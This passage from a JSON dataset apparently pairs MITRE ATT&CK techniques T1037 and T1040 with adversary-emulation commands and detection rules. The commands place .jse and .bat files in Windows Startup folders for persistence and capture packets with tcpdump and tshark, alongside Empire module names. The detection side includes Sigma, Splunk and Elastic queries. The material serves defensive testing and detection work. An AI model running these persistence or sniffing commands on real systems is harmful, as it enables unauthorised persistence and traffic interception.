$PathToAtomicsFolder\\T1037\\src\\jsestartup.jse \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\nCopy-Item $PathToAtomicsFolder\\T1037\\src\\jsestartup.jse \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\ncscript.exe /E:Jscript \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\ncscript.exe /E:Jscript \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\n", "name": "powershell", "cleanup_command": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\" -ErrorAction Ignore\nRemove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\" -ErrorAction Ignore\n"}}, {"description": "bat files can be placed in and ran from the startup folder to maintain persistance\n", "supported_platforms": ["windows"], "name": "Supicious bat file run from startup Folder", "executor": {"elevation_required": true, "command": "Copy-Item $PathToAtomicsFolder\\T1037\\src\\batstartup.bat \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nCopy-Item $PathToAtomicsFolder\\T1037\\src\\batstartup.bat \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\nStart-Process \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nStart-Process \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\n", "name": "powershell", "cleanup_command": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\" -ErrorAction Ignore\nRemove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\" -ErrorAction Ignore\n"}}], "attack_technique": "T1037"}}, {"SysmonHunter - T1037": {"phase": "Persistence", "query": [{"process": {"cmdline": {"pattern": "\\Environment\\UserInitMprLogonScript"}}, "type": "process"}, {"type": "reg", "reg": {"path": {"pattern": "\\Environment\\UserInitMprLogonScript"}}}], "description": null, "name": "Logon Scripts", "level": "medium"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1037", "Empire Module": "python/persistence/multi/desktopfile", "Technique": "Logon Scripts", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/persistence/multi/desktopfile\":  [\"T1037\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1037", "Empire Module": "python/persistence/osx/loginhook", "Technique": "Logon Scripts", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/persistence/osx/loginhook\":  [\"T1037\"],"}}], "queries": [{"query": "Sysmon| where EventID == 1 and process_command_line contains \"*REG*ADD*HKCU\\\\Environment*UserInitMprLogonScript*\"", "product": "Azure Sentinel", "name": "Logon Scripts"}, {"query": "action: global\ntitle: Logon Scripts (UserInitMprLogonScript)\nid: 0a98a10c-685d-4ab0-bddc-b6bdd1d48458\nstatus: experimental\ndescription: Detects creation or execution of UserInitMprLogonScript persistence method\nreferences:\n    - https://attack.mitre.org/techniques/T1037/\ntags:\n    - attack.t1037\n    - attack.persistence\n    - attack.lateral_movement\nauthor: Tom Ueltschi (@c_APT_ure)\nfalsepositives:\n    - exclude legitimate logon scripts\n    - penetration tests, red teaming\nlevel: high\n", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "action: global\ntitle: Logon Scripts (UserInitMprLogonScript)\nid: 0a98a10c-685d-4ab0-bddc-b6bdd1d48458\nstatus: experimental\ndescription: Detects creation or execution of UserInitMprLogonScript persistence method\nreferences:\n    - https://attack.mitre.org/techniques/T1037/\ntags:\n    - attack.t1037\n    - attack.persistence\n    - attack.lateral_movement\nauthor: Tom Ueltschi (@c_APT_ure)\nfalsepositives:\n    - exclude legitimate logon scripts\n    - penetration tests, red teaming\nlevel: high\n", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((ParentImage.keyword:*\\\\\\\\userinit.exe AND (NOT (Image.keyword:*\\\\\\\\explorer.exe))) AND (NOT (CommandLine.keyword:*\\\\\\\\netlogon.bat)))\\nCommandLine.keyword:*UserInitMprLogonScript*\\n(EventID:(\"11\" OR \"12\" OR \"13\" OR \"14\") AND TargetObject.keyword:*UserInitMprLogonScript*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Logon-Scripts-UserInitMprLogonScript <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Logon Scripts (UserInitMprLogonScript)\",\\n    \"description\": \"Detects creation or execution of UserInitMprLogonScript persistence method\",\\n    \"tags\": [\\n      \"attack.t1037\",\\n      \"attack.persistence\",\\n      \"attack.lateral_movement\"\\n    ],\\n    \"query\": \"((ParentImage.keyword:*\\\\\\\\\\\\\\\\userinit.exe AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\explorer.exe))) AND (NOT (CommandLine.keyword:*\\\\\\\\\\\\\\\\netlogon.bat)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((ParentImage.keyword:*\\\\\\\\\\\\\\\\userinit.exe AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\explorer.exe))) AND (NOT (CommandLine.keyword:*\\\\\\\\\\\\\\\\netlogon.bat)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Logon Scripts (UserInitMprLogonScript)\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\ncurl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Logon-Scripts-UserInitMprLogonScript-2 <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Logon Scripts (UserInitMprLogonScript)\",\\n    \"description\": \"Detects creation or execution of UserInitMprLogonScript persistence method\",\\n    \"tags\": [\\n      \"attack.t1037\",\\n      \"attack.persistence\",\\n      \"attack.lateral_movement\"\\n    ],\\n    \"query\": \"CommandLine.keyword:*UserInitMprLogonScript*\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:*UserInitMprLogonScript*\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Logon Scripts (UserInitMprLogonScript)\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\ncurl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Logon-Scripts-UserInitMprLogonScript-3 <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Logon Scripts (UserInitMprLogonScript)\",\\n    \"description\": \"Detects creation or execution of UserInitMprLogonScript persistence method\",\\n    \"tags\": [\\n      \"attack.t1037\",\\n      \"attack.persistence\",\\n      \"attack.lateral_movement\"\\n    ],\\n    \"query\": \"(EventID:(\\\\\"11\\\\\" OR \\\\\"12\\\\\" OR \\\\\"13\\\\\" OR \\\\\"14\\\\\") AND TargetObject.keyword:*UserInitMprLogonScript*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:(\\\\\"11\\\\\" OR \\\\\"12\\\\\" OR \\\\\"13\\\\\" OR \\\\\"14\\\\\") AND TargetObject.keyword:*UserInitMprLogonScript*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Logon Scripts (UserInitMprLogonScript)\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((ParentImage.keyword:*\\\\\\\\userinit.exe AND (NOT (Image.keyword:*\\\\\\\\explorer.exe))) AND (NOT (CommandLine.keyword:*\\\\\\\\netlogon.bat)))\\nCommandLine.keyword:*UserInitMprLogonScript*\\n(EventID:(\"11\" \"12\" \"13\" \"14\") AND TargetObject.keyword:*UserInitMprLogonScript*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((ParentImage=\"*\\\\\\\\userinit.exe\" NOT (Image=\"*\\\\\\\\explorer.exe\")) NOT (CommandLine=\"*\\\\\\\\netlogon.bat\"))\\nCommandLine=\"*UserInitMprLogonScript*\"\\n((EventID=\"11\" OR EventID=\"12\" OR EventID=\"13\" OR EventID=\"14\") TargetObject=\"*UserInitMprLogonScript*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (ParentImage=\"*\\\\\\\\userinit.exe\"  -(Image=\"*\\\\\\\\explorer.exe\"))  -(CommandLine=\"*\\\\\\\\netlogon.bat\"))\\n(event_id=\"1\" CommandLine=\"*UserInitMprLogonScript*\")\\n(event_id IN [\"11\", \"12\", \"13\", \"14\"] TargetObject=\"*UserInitMprLogonScript*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*.*\\\\userinit\\\\.exe)(?=.*(?!.*(?:.*(?=.*.*\\\\explorer\\\\.exe))))))(?=.*(?!.*(?:.*(?=.*.*\\\\netlogon\\\\.bat)))))'\\ngrep -P '^.*UserInitMprLogonScript.*'\\ngrep -P '^(?:.*(?=.*(?:.*11|.*12|.*13|.*14))(?=.*.*UserInitMprLogonScript.*))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1040/T1040.yaml", "command": "tcpdump -c 5 -nnni ens33\ntshark -c 5 -i ens33\n", "name": null}, {"source": "atomics/T1040/T1040.yaml", "command": "tcpdump -c 5 -nnni en0A\ntshark -c 5 -i en0A\n", "name": null}, {"source": "atomics/T1040/T1040.yaml", "command": "\"c:\\Program Files\\Wireshark\\tshark.exe\" -i Ethernet0 -c 5\nc:\\windump.exe\n", "name": null}, {"source": "atomics/T1040/T1040.yaml", "command": "& \"c:\\Program Files\\Wireshark\\tshark.exe\" -i Ethernet0 -c 5\n& c:\\windump.exe\n", "name": null}, {"source": "data/abilities/credential-access/1b4fb81c-8090-426c-93ab-0a633e7a16a7.yml", "command": {"windows": {"psh": {"cleanup": "Remove-NetEventSession -Name \"Capture\"\nRemove-Item $ENV:UserProfile\\Desktop\\pcap.etl\nRemove-Item $ENV:UserProfile\\Desktop\\pcap.cab\n", "command": "New-NetEventSession -Name \"PCAP\" -CaptureMode SaveToFile -LocalFilePath \"$ENV:UserProfile\\Desktop\\pcap.etl\" -MaxFileSize 0\nAdd-NetEventPacketCaptureProvider -SessionName \"PCAP\"\nStart-NetEventSession -Name \"PCAP\"\nStart-Sleep -s 60\nStop-NetEventSession -Name \"PCAP\"\nGet-Content \"$ENV:UserProfile\\Desktop\\pcap.etl\"\n"}}, "darwin": {"sh": {"command": "tcpdump -i en0 & sleep 5; kill $!\n"}}}, "name": "Perform a packet capture"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/packet_capture", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/packet_capture", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/linux/sniffer", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/linux/sniffer", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/sniffer", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/sniffer", "name": "Empire Module Command"}, {"source": "Kirtar22/Litmus_Test", "command": "tcpdump -c 5 -nnni #{interface}", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "tshark -c 5 -i #{interface}", "name": null}], "command_list": ["tcpdump -c 5 -nnni ens33\ntshark -c 5 -i ens33\n", "tcpdump -c 5 -nnni en0A\ntshark -c 5 -i en0A\n", "\"c:\\Program Files\\Wireshark\\tshark.exe\" -i Ethernet0 -c 5\nc:\\windump.exe\n", "& \"c:\\Program Files\\Wireshark\\tshark.exe\" -i Ethernet0 -c 5\n& c:\\windump.exe\n", {"windows": {"psh": {"cleanup": "Remove-NetEventSession -Name \"Capture\"\nRemove-Item $ENV:UserProfile\\Desktop\\pcap.etl\nRemove-Item $ENV:UserProfile\\Desktop\\pcap.cab\n", "command": "New-NetEventSession -Name \"PCAP\" -CaptureMode SaveToFile -LocalFilePath \"$ENV:UserProfile\\Desktop\\pcap.etl\" -MaxFileSize 0\nAdd-NetEventPacketCaptureProvider -SessionName \"PCAP\"\nStart-NetEventSession -Name \"PCAP\"\nStart-Sleep -s 60\nStop-NetEventSession -Name \"PCAP\"\nGet-Content \"$ENV:UserProfile\\Desktop\\pcap.etl\"\n"}}, "darwin": {"sh": {"command": "tcpdump -i en0 & sleep 5; kill $!\n"}}}, "powershell/collection/packet_capture", "powershell/collection/packet_capture", "python/collection/linux/sniffer", "python/collection/linux/sniffer", "python/collection/osx/sniffer", "python/collection/osx/sniffer", "tcpdump -c 5 -nnni #{interface}", "tshark -c 5 -i #{interface}"], "technique_id": "T1040", "parsed_datasets": [{"Atomic Red Team Test - Network Sniffing": {"display_name": "Network Sniffing", "atomic_tests": [{"description": "Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.\n", "supported_platforms": ["linux"], "name": "Packet Capture Linux", "input_arguments": {"interface": {"default": "ens33", "type": "String", "description": "Specify interface to perform PCAP on."}}, "executor": {"elevation_required": true, "command": "tcpdump -c 5 -nnni #{interface}\ntshark -c 5 -i #{interface}\n", "name": "bash"}}, {"description": "Perform a PCAP on MacOS. This will require Wireshark/tshark to be installed. TCPdump may already be installed.\n", "supported_platforms": ["macos"], "name": "Packet Capture MacOS", "input_arguments": {"interface": {"default": "en0A", "type": "String", "description": "Specify interface to perform PCAP on."}}, "executor": {"elevation_required": true, "command": "tcpdump -c 5 -nnni #{interface}\ntshark -c 5 -i #{interface}\n", "name": "bash"}}, {"description": "Perform a packet capture using the windows command prompt. This will require a host that has Wireshark/Tshark\ninstalled, along with WinPCAP. Windump will require the windump executable.\n", "supported_platforms": ["windows"], "name": "Packet Capture Windows Command Prompt", "input_arguments": {"interface": {"default": "Ethernet0", "type": "String", "description": "Specify interface to perform PCAP on."}}, "executor": {"elevation_required": true, "command": "\"c:\\Program Files\\Wireshark\\tshark.exe\" -i #{interface} -c 5\nc:\\windump.exe\n", "name": "command_prompt"}}, {"description": "Perform a packet capture using PowerShell with windump or tshark. This will require a host that has Wireshark/Tshark\ninstalled, along with WinPCAP. Windump will require the windump executable.\n", "supported_platforms": ["windows"], "name": "Packet Capture PowerShell", "input_arguments": {"interface": {"default": "Ethernet0", "type": "String", "description": "Specify interface to perform PCAP on."}}, "executor": {"elevation_required": true, "command": "& \"c:\\Program Files\\Wireshark\\tshark.exe\" -i #{interface} -c 5\n& c:\\windump.exe\n", "name": "powershell"}}], "attack_technique": "T1040"}}, {"Mitre Stockpile - Perform a packet capture": {"platforms": {"windows": {"psh": {"cleanup": "Remove-NetEventSession -Name \"Capture\"\nRemove-Item $ENV:UserProfile\\Desktop\\pcap.etl\nRemove-Item $ENV:UserProfile\\Desktop\\pcap.cab\n", "command": "New-NetEventSession -Name \"PCAP\" -CaptureMode SaveToFile -LocalFilePath \"$ENV:UserProfile\\Desktop\\pcap.etl\" -MaxFileSize 0\nAdd-NetEventPacketCaptureProvider -SessionName \"PCAP\"\nStart-NetEventSession -Name \"PCAP\"\nStart-Sleep -s 60\nStop-NetEventSession -Name \"PCAP\"\nGet-Content \"$ENV:UserProfile\\Desktop\\pcap.etl\"\n"}}, "darwin": {"sh": {"command": "tcpdump -i en0 & sleep 5; kill $!\n"}}}, "description": "Perform a packet capture", "tactic": "credential-access", "technique": {"attack_id": "T1040", "name": "Network Sniffing"}, "id": "1b4fb81c-8090-426c-93ab-0a633e7a16a7", "name": "Sniff network traffic"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1040", "Empire Module": "powershell/collection/packet_capture", "Technique": "Network Sniffing", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/collection/packet_capture\":  [\"T1040\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1040", "Empire Module": "python/collection/linux/sniffer", "Technique": "Network Sniffing", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/collection/linux/sniffer\":  [\"T1040\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1040", "Empire Module": "python/collection/osx/sniffer", "Technique": "Network Sniffing", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/collection/osx/sniffer\":  [\"T1040\"],"}}], "queries": [{"query": "Sysmon| where EventID == 1 and (process_path contains \"tshark.exe\"or process_path contains \"windump.exe\"or process_path contains \"logman.exe\"or process_path contains \"tcpdump.exe\"or process_path contains \"wprui.exe\"or process_path contains \"wpr.exe\")", "product": "Azure Sentinel", "name": "Network Sniffing"}, {"query": "title: Capture a Network Trace with netsh.exe\nid: d3c3861d-c504-4c77-ba55-224ba82d0118\nstatus: experimental\ndescription: Detects capture a network trace via netsh.exe trace functionality\nreferences:\n    - https://blogs.msdn.microsoft.com/canberrapfe/2012/03/30/capture-a-network-trace-without-installing-anything-capture-a-network-trace-of-a-reboot/\nauthor: Kutepov Anton, oscd.community\ndate: 2019/10/24\ntags:\n    - attack.discovery\n    - attack.t1040\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all: \n            - netsh\n            - trace\n            - start\n    condition: selection    \nfalsepositives: \n    - Legitimate administrator or user uses netsh.exe trace functionality for legitimate reason\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Capture a Network Trace with netsh.exe\nid: d3c3861d-c504-4c77-ba55-224ba82d0118\nstatus: experimental\ndescription: Detects capture a network trace via netsh.exe trace functionality\nreferences:\n    - https://blogs.msdn.microsoft.com/canberrapfe/2012/03/30/capture-a-network-trace-without-installing-anything-capture-a-network-trace-of-a-reboot/\nauthor: Kutepov Anton, oscd.community\ndate: 2019/10/24\ntags:\n    - attack.discovery\n    - attack.t1040\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all: \n            - netsh\n            - trace\n            - start\n    condition: selection    \nfalsepositives: \n    - Legitimate administrator or user uses netsh.exe trace functionality for legitimate reason\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(CommandLine.keyword:*netsh* AND CommandLine.keyword:*trace* AND CommandLine.keyword:*start*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Capture-a-Network-Trace-with-netsh.exe <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Capture a Network Trace with netsh.exe\",\\n    \"description\": \"Detects capture a network trace via netsh.exe trace functionality\",\\n    \"tags\": [\\n      \"attack.discovery\",\\n      \"attack.t1040\"\\n    ],\\n    \"query\": \"(CommandLine.keyword:*netsh* AND CommandLine.keyword:*trace* AND CommandLine.keyword:*start*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(CommandLine.keyword:*netsh* AND CommandLine.keyword:*trace* AND CommandLine.keyword:*start*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Capture a Network Trace with netsh.exe\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(CommandLine.keyword:*netsh* AND CommandLine.keyword:*trace* AND CommandLine.keyword:*start*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"*netsh*\" CommandLine=\"*trace*\" CommandLine=\"*start*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine=\"*netsh*\" CommandLine=\"*trace*\" CommandLine=\"*start*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*netsh.*)(?=.*.*trace.*)(?=.*.*start.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Network Sniffing\nid: ba1f7802-adc7-48b4-9ecb-81e227fddfd5\nstatus: experimental\ndescription: Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary\n    may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\nauthor: Timur Zinniatullin, oscd.community\ndate: 2019/10/21\nmodified: 2019/11/04\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1040/T1040.yaml\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n      - Image|endswith: '\\tshark.exe'\n        CommandLine|contains: '-i'\n      - Image|endswith: '\\windump.exe'\n    condition: selection\nfalsepositives:\n    - Admin activity\nfields:\n    - Image\n    - CommandLine\n    - User\n    - LogonGuid\n    - Hashes\n    - ParentProcessGuid\n    - ParentCommandLine\nlevel: low\ntags:\n    - attack.credential_access\n    - attack.discovery\n    - attack.t1040", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Network Sniffing\nid: ba1f7802-adc7-48b4-9ecb-81e227fddfd5\nstatus: experimental\ndescription: Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary\n    may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\nauthor: Timur Zinniatullin, oscd.community\ndate: 2019/10/21\nmodified: 2019/11/04\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1040/T1040.yaml\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n      - Image|endswith: '\\tshark.exe'\n        CommandLine|contains: '-i'\n      - Image|endswith: '\\windump.exe'\n    condition: selection\nfalsepositives:\n    - Admin activity\nfields:\n    - Image\n    - CommandLine\n    - User\n    - LogonGuid\n    - Hashes\n    - ParentProcessGuid\n    - ParentCommandLine\nlevel: low\ntags:\n    - attack.credential_access\n    - attack.discovery\n    - attack.t1040", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((Image.keyword:*\\\\\\\\tshark.exe AND CommandLine.keyword:*\\\\-i*) OR Image.keyword:*\\\\\\\\windump.exe)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Network-Sniffing <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Network Sniffing\",\\n    \"description\": \"Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.discovery\",\\n      \"attack.t1040\"\\n    ],\\n    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\tshark.exe AND CommandLine.keyword:*\\\\\\\\-i*) OR Image.keyword:*\\\\\\\\\\\\\\\\windump.exe)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\tshark.exe AND CommandLine.keyword:*\\\\\\\\-i*) OR Image.keyword:*\\\\\\\\\\\\\\\\windump.exe)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Network Sniffing\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n            Image = {{_source.Image}}\\\\n      CommandLine = {{_source.CommandLine}}\\\\n             User = {{_source.User}}\\\\n        LogonGuid = {{_source.LogonGuid}}\\\\n           Hashes = {{_source.Hashes}}\\\\nParentProcessGuid = {{_source.ParentProcessGuid}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((Image.keyword:*\\\\\\\\tshark.exe AND CommandLine.keyword:*\\\\-i*) OR Image.keyword:*\\\\\\\\windump.exe)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": 